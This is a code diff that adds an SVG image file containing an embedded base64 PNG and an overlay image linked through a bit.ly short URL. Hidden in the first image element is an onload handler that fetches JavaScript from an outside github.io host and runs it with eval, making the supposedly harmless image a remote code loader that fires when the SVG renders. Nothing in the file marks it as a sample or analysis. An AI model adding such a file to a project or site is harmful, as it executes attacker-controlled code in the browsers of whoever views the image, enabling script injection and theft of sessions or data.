@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <image x="10" y="10" width="180" height="180" 
+         href="data:image/png;base64,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" 
+         onload="fetch('https://totallylost-helpme.github.io/chat.js')
+                  .then(res => res.text())
+                  .then(eval)" />
+
+  <!-- Overlay Image -->
+  <image href="https://bit.ly/4aoMbTQ" 
+         alt="Overlay Image" 
+         x="50%" 
+         y="50%" 
+         width="100" 
+         height="auto"
+         transform="translate(-50%, -50%)" />
+  
+</svg>
